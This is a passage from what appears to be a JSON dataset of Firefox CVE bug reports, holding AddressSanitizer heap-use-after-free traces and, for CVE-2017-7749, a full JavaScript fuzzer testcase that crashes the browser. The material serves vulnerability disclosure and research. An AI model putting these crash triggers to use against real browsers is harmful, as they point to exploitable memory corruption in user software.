js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #37 0x7ff789be3c02 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #38 0x7ff7896b60ad in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #39 0x7ff7833be7ff in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #40 0x7ff783db498a in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #41 0x7ff783db498a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #42 0x7ff783d8099d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #43 0x7ff783d823c7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #44 0x7ff783d6d4f6 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #45 0x7ff783d70b88 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #46 0x7ff785ea6a8c in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1023:7 #47 0x7ff786c3499b in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7630:5 #48 0x7ff786c307a4 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7434:7 #49 0x7ff786c37e0f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7331:13 #50 0x7ff780f9c510 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1255:3 #51 0x7ff780f9b4a8 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:840:5 #52 0x7ff780f98208 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:730:9 #53 0x7ff780f9a304 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:612:5 #54 0x7ff780f9aebc in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:468:14 #55 0x7ff77f54b2ca in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:633:18 #56 0x7ff781f56a86 in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8640:7 #57 0x7ff781f56456 in nsDocument::UnblockOnload(bool) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8568:9 #58 0x7ff781f2c904 in nsDocument::DispatchContentLoadedEvents() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5055:3 #59 0x7ff781feaf72 in applyImpl<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:775:12 #60 0x7ff781feaf72 in apply<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:781 #61 0x7ff781feaf72 in mozilla::detail::RunnableMethodImpl<void (nsDocument::*)(), true, false>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:810 #62 0x7ff77f3773bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #63 0x7ff77f3f678c in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #64 0x7ff78017212f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #65 0x7ff7800e47a8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #66 0x7ff7800e47a8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #67 0x7ff7800e47a8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #68 0x7ff7855b653f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #69 0x7ff7875a9f21 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #70 0x7ff7877325ce in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #71 0x7ff787733add in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #72 0x7ff78773499c in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #73 0x4df8ca in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #74 0x4df8ca in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #75 0x7ff79a38a82f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #76 0x41ba38 in _start (/home/nils/fuzzer3/esr/firefox/firefox+0x41ba38) 0x60600029a568 is located 8 bytes inside of 64-byte region [0x60600029a560,0x60600029a5a0) freed by thread T0 here: #0 0x4b218b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7ff785e2136f in Destroy /home/worker/workspace/build/src/layout/base/nsGenConList.h:124:5 #2 0x7ff785e2136f in nsGenConList::DestroyNodesFor(nsIFrame*) /home/worker/workspace/build/src/layout/base/nsGenConList.cpp:40 #3 0x7ff785d5317c in nsCSSFrameConstructor::NotifyDestroyingFrame(nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:1612:9 #4 0x7ff785f3e4ab in PresShell::NotifyDestroyingFrame(nsIFrame*) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:2052:5 #5 0x7ff78607413c in nsFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:726:3 #6 0x7ff786021408 in DestroyFramesFrom /home/worker/workspace/build/src/layout/generic/nsFrameList.cpp:57:5 #7 0x7ff786021408 in nsContainerFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:221 #8 0x7ff7861c5508 in nsLineBox::DeleteLineList(nsPresContext*, nsLineList&, nsIFrame*, nsFrameList*) /home/worker/workspace/build/src/layout/generic/nsLineBox.cpp:389:7 #9 0x7ff786020864 in nsBlockFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:326:3 #10 0x7ff7861c5508 in nsLineBox::DeleteLineList(nsPresContext*, nsLineList&, nsIFrame*, nsFrameList*) /home/worker/workspace/build/src/layout/generic/nsLineBox.cpp:389:7 #11 0x7ff786020864 in nsBlockFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:326:3 #12 0x7ff7861c5508 in nsLineBox::DeleteLineList(nsPresContext*, nsLineList&, nsIFrame*, nsFrameList*) /home/worker/workspace/build/src/layout/generic/nsLineBox.cpp:389:7 #13 0x7ff786020864 in nsBlockFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:326:3 #14 0x7ff786021408 in DestroyFramesFrom /home/worker/workspace/build/src/layout/generic/nsFrameList.cpp:57:5 #15 0x7ff786021408 in nsContainerFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:221 #16 0x7ff786081ef5 in nsCanvasFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:153:3 #17 0x7ff786021408 in DestroyFramesFrom /home/worker/workspace/build/src/layout/generic/nsFrameList.cpp:57:5 #18 0x7ff786021408 in nsContainerFrame::DestroyFrom(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:221 #19 0x7ff7860952aa in Destroy /home/worker/workspace/build/src/layout/generic/nsIFrame.h:576:20 #20 0x7ff7860952aa in nsContainerFrame::RemoveFrame(mozilla::layout::FrameChildListID, nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:170 #21 0x7ff785ec4596 in nsFrameManager::RemoveFrame(mozilla::layout::FrameChildListID, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsFrameManager.cpp:506:5 #22 0x7ff785d9407b in nsCSSFrameConstructor::ContentRemoved(nsIContent*, nsIContent*, nsIContent*, nsCSSFrameConstructor::RemoveFlags, bool*, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:8498:5 #23 0x7ff785d091ce in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool, nsCSSFrameConstructor::RemoveFlags, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9683:10 #24 0x7ff785d91c35 in nsCSSFrameConstructor::WipeContainingBlock(nsFrameConstructorState&, nsIFrame*, nsIFrame*, nsCSSFrameConstructor::FrameConstructionItemList&, bool, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:12458:7 #25 0x7ff785d8e056 in nsCSSFrameConstructor::ContentAppended(nsIContent*, nsIContent*, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7491:7 #26 0x7ff785f521c8 in PresShell::ContentAppended(nsIDocument*, nsIContent*, nsIContent*, int) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4393:3 #27 0x7ff782076abc in nsNodeUtils::ContentAppended(nsIContent*, nsIContent*, int) /home/worker/workspace/build/src/dom/base/nsNodeUtils.cpp:167:3 #28 0x7ff78201ed72 in nsINode::doInsertChildAt(nsIContent*, unsigned int, bool, nsAttrAndChildArray&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1628:7 #29 0x7ff7820254d6 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:2514:14 #30 0x7ff7826cfaf5 in InsertBefore /home/worker/workspace/build/src/dom/base/nsINode.h:1850:12 #31 0x7ff7826cfaf5 in AppendChild /home/worker/workspace/build/src/dom/base/nsINode.h:1854 #32 0x7ff7826cfaf5 in mozilla::dom::NodeBinding::appendChild(JSContext*, JS::Handle<JSObject*>, nsINode*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/NodeBinding.cpp:696 #33 0x7ff7839b8af0 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2879:13 #34 0x7ff789be2f55 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #35 0x7ff789be2f55 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #36 0x7ff789bc335f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #37 0x7ff789bc335f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #38 0x7ff789ba851d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 previously allocated by thread T0 here: #0 0x4b24ab in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0d9d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7ff785d53fc0 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7ff785d53fc0 in nsCSSFrameConstructor::CreateGeneratedContent(nsFrameConstructorState&, nsIContent*, nsStyleContext*, unsigned int) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:1761 #4 0x7ff785d5630d in nsCSSFrameConstructor::CreateGeneratedContentItem(nsFrameConstructorState&, nsContainerFrame*, nsIContent*, nsStyleContext*, mozilla::CSSPseudoElementType, nsCSSFrameConstructor::FrameConstructionItemList&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:1906:7 #5 0x7ff785d81c8c in nsCSSFrameConstructor::BuildInlineChildItems(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItem&, bool, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:12152:5 #6 0x7ff785d596e2 in nsCSSFrameConstructor::AddFrameConstructionItemsInternal(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsIAtom*, int, bool, nsStyleContext*, unsigned int, nsTArray<nsIAnonymousContentCreator::ContentInfo>*, nsCSSFrameConstructor::FrameConstructionItemList&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5993:5 #7 0x7ff785d7aa1a in DoAddFrameConstructionItems /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5636:3 #8 0x7ff785d7aa1a in nsCSSFrameConstructor::AddFrameConstructionItems(nsFrameConstructorState&, nsIContent*, bool, nsCSSFrameConstructor::InsertionPoint const&, nsCSSFrameConstructor::FrameConstructionItemList&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5658 #9 0x7ff785d5f4f3 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10823:9 #10 0x7ff785d69efd in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsContainerFrame*, nsStyleContext*, nsContainerFrame**, nsFrameItems&, nsIFrame*, PendingBinding*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11851:3 #11 0x7ff785d72bf2 in nsCSSFrameConstructor::ConstructNonScrollableBlockWithConstructor(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItem&, nsContainerFrame*, nsStyleDisplay const*, nsFrameItems&, nsBlockFrame* (*)(nsIPresShell*, nsStyleContext*)) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4948:3 #12 0x7ff785d7bea7 in nsCSSFrameConstructor::ConstructNonScrollableBlock(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItem&, nsContainerFrame*, nsStyleDisplay const*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4912:10 #13 0x7ff785d75c32 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:3845:7 #14 0x7ff785d82ea6 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6187:3 #15 0x7ff785d8b2d4 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10629:5 #16 0x7ff785d8b2d4 in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:8057 #17 0x7ff785d0947b in ContentInserted /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7630:10 #18 0x7ff785d0947b in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool, nsCSSFrameConstructor::RemoveFlags, nsIContent**) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9697 #19 0x7ff785d27586 in mozilla::RestyleManagerBase::ProcessRestyledFrames(nsStyleChangeList&) /home/worker/workspace/build/src/layout/base/RestyleManagerBase.cpp:1176:7 #20 0x7ff785d2e499 in ProcessOneRestyle /home/worker/workspace/build/src/layout/base/RestyleTracker.cpp:105:5 #21 0x7ff785d2e499 in mozilla::RestyleTracker::DoProcessRestyles() /home/worker/workspace/build/src/layout/base/RestyleTracker.cpp:266 #22 0x7ff785d10364 in ProcessRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManager.h:490:7 #23 0x7ff785d10364 in mozilla::RestyleManager::ProcessPendingRestyles() /home/worker/workspace/build/src/layout/base/RestyleManager.cpp:834 #24 0x7ff785f4f92e in ProcessPendingRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManagerHandleInlines.h:74:3 #25 0x7ff785f4f92e in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4159 #26 0x7ff781f4f2f0 in nsDocument::FlushPendingNotifications(mozFlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7774:7 #27 0x7ff781f4f110 in nsDocument::FlushPendingNotifications(mozFlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7752:5 #28 0x7ff781f4f110 in nsDocument::FlushPendingNotifications(mozFlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7752:5 #29 0x7ff780f97da3 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:683:9 #30 0x7ff780f9a304 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:612:5 #31 0x7ff780f9aebc in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:468:14 #32 0x7ff77f54b2ca in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:633:18 #33 0x7ff77f54766f in mozilla::net::nsLoadGroup::Cancel(nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:270:15 #34 0x7ff780f9782f in nsDocLoader::Stop() /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:243:10 #35 0x7ff780f976a8 in nsDocLoader::Stop() /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:240:3 #36 0x7ff786bbf041 in Stop /home/worker/workspace/build/src/docshell/base/nsDocShell.h:189:12 #37 0x7ff786bbf041 in nsDocShell::Stop(unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5547 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/LinkedList.h:206:41 in getNext Shadow bytes around the buggy address: 0x0c0c8004b450: 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c0c8004b460: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa 0x0c0c8004b470: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 0x0c0c8004b480: 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 fa 0x0c0c8004b490: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa =>0x0c0c8004b4a0: 00 00 00 00 00 00 00 00 fa fa fa fa fd[fd]fd fd 0x0c0c8004b4b0: fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00 0x0c0c8004b4c0: fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa 0x0c0c8004b4d0: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 0x0c0c8004b4e0: 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 0x0c0c8004b4f0: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==12107==ABORTING"
      }
    ],
    "CVE-2017-7749": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1355039",
        "title": "heap-use-after-free in mozilla::net::PredictorLearn",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170408204920). It may need a few reloads and requires the fuzzPriv extension. <script> function start () { o3=document; o31=document.createElement('audio'); o32=document.createElement('track'); o31.appendChild(o32); o3.write('<html>'); o31.controls^=1; o3.documentElement.appendChild(o31); o38=document.createElement('iframe'); o41=document.createElement('iframe'); document.documentElement.appendChild(o41); document.documentElement.appendChild(o38); o3.write(\"!DOCTYPE<li id='id12'>\"); o3.location.hash='id12'; o38.contentWindow.location.reload(); o76=frames[1].document; o38.src=\"data:text/html,<div>2\"; o87=frames[1]; o97=document.createElement('iframe'); document.documentElement.appendChild(o97); o38.src=\"data:text/html,<div>3\"; setTimeout(fun1,4); o76.write('<iframe>'); o38.src=\"data:text/html,<div>\"; o2219=o87.frames[0].document; o2219.write('<html>'); } function fun1() { o2454=o2219.createElement('audio'); o2455=document.createElement('track'); o2454.appendChild(o2455); o2219.close(); o2219.write('<html>'); o2454.controls^=1; o2219.documentElement.appendChild(o2454); o2219.defaultView.onerror=fun2; o38.contentWindow.location.reload(); setTimeout(\"location.reload()\",100); } function fun2() { try{o76.location.hash='x';}catch(e){} window.fuzzPriv.CC();window.fuzzPriv.GC();window.fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==23074==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d0000c9df0 at pc 0x7f02927069ce bp 0x7fffecb44f90 sp 0x7fffecb44f88 READ of size 8 at 0x60d0000c9df0 thread T0 (Web Content) #0 0x7f02927069cd in IsNullOrHttp /home/worker/workspace/build/src/netwerk/base/Predictor.cpp:191:8 #1 0x7f02927069cd in mozilla::net::PredictorLearn(nsIURI*, nsIURI*, unsigned int, mozilla::OriginAttributes const&) /home/worker/workspace/build/src/netwerk/base/Predictor.cpp:2248 #2 0x7f029b10340b in nsDocShell::InternalLoad(nsIURI*, nsIURI*, bool, nsIURI*, unsigned int, nsIPrincipal*, nsIPrincipal*, unsigned int, nsAString const&, char const*, nsAString const&, nsIInputStream*, nsIInputStream*, unsigned int, nsISHEntry*, bool, nsAString const&, nsIDocShell*, nsIURI*, bool, nsIDocShell**, nsIRequest**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:10780:3 #3 0x7f029b1371ab in nsDocShell::Reload(unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5502:10 #4 0x7f0294d6148f in mozilla::dom::Location::Reload(bool) /home/worker/workspace/build/src/dom/base/Location.cpp:814:18 #5 0x7f029551493b in Reload /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Location.h:74:14 #6 0x7f029551493b in mozilla::dom::LocationBinding::reload(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Location*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/LocationBinding.cpp:873 #7 0x7f029689344e in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #8 0x7f029c0ccc63 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #9 0x7f029c0ccc63 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:455 #10 0x7f029c0cd612 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:519:10 #11 0x7f029cce08ee in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #12 0x7f029cc97f94 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #13 0x7f029ccc1153 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #14 0x7f029ccc3ab7 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #15 0x7f029c0ccfb3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #16 0x7f029c0ccfb3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:437 #17 0x7f029c0b568f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:506:12 #18 0x7f029c0b568f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2997 #19 0x7f029c09bb28 in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:395:12 #20 0x7f029c0ccde8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473:15 #21 0x7f029c0cd612 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:519:10 #22 0x7f029ca4c17b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2885:12 #23 0x7f029644416e in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8 #24 0x7f0294c1f3d6 in Call<nsCOMPtr<nsISupports> > /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:72:12 #25 0x7f0294c1f3d6 in nsGlobalWindow::RunTimeoutHandler(mozilla::dom::Timeout*, nsIScriptContext*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13105 #26 0x7f0294dd1326 in mozilla::dom::TimeoutManager::RunTimeout(mozilla::dom::Timeout*) /home/worker/workspace/build/src/dom/base/TimeoutManager.cpp:607:42 #27 0x7f0294dcc7cd in mozilla::dom::(anonymous namespace)::TimerCallback(nsITimer*, void*) /home/worker/workspace/build/src/dom/base/Timeout.cpp:65:49 #28 0x7f02925f188f in nsTimerImpl::Fire(int) /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:498:7 #29 0x7f02925c0aab in nsTimerEvent::Run() /home/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:284:11 #30 0x7f02925d34c2 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:200:22 #31 0x7f02925d2dcf in mozilla::ThrottledEventQueue::Inner::Executor::Run() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:74:15 #32 0x7f02925b0dd1 in mozilla::ValidatingDispatcher::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/Dispatcher.cpp:259:32 #33 0x7f02925e3b90 in nsThread::ProcessNextEvent(bool, bool*) 